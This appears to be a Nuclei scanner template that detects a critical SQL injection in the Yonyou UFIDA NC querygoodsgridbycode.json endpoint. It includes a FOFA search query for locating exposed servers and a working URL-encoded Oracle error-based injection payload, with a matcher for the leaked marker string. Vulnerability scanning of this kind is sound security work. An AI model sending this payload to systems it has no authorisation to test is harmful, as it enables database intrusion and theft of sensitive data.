id: yonyou-ufida-nc-querygoodsgridbycode-sqli

info:
  name: Yonyou UFIDA NC querygoodsgridbycode SQL Injection
  author: Co5mos
  severity: critical
  description: |
    用友NC 接口 `/ecp/productonsale/querygoodsgridbycode.json` 存在SQL注入漏洞，攻击者可以利用该漏洞执行任意SQL语句，从而获取数据库中的敏感信息或控制数据库服务器。
  metadata:
    fofa-query: 'app="用友-UFIDA-NC"'
  tags: ufida, sqli, yonyou

http:
  - method: GET
    path:
      - "{{BaseURL}}/ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29--+dpxi"

    matchers:
      - type: word
        part: body
        words:
          - "qbzqq1qzvjq"
